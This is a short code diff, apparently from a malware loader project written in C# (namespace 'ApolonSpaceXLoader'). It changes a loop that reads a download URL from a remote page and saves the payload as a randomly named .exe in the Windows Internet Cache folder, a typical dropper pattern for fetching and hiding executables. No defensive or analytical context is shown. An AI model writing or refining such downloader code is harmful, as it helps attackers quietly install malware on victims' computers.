@@ -18,12 +18,11 @@ namespace ApolonSpaceXLoader
         {
             try
             {
-                string dropPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
-
                 while (true)
                 {
                     WebClient wc = new WebClient();
                     string rnd = Helper.RandomID();
+                    string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";
 
                     string urlOnPage;
                     using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
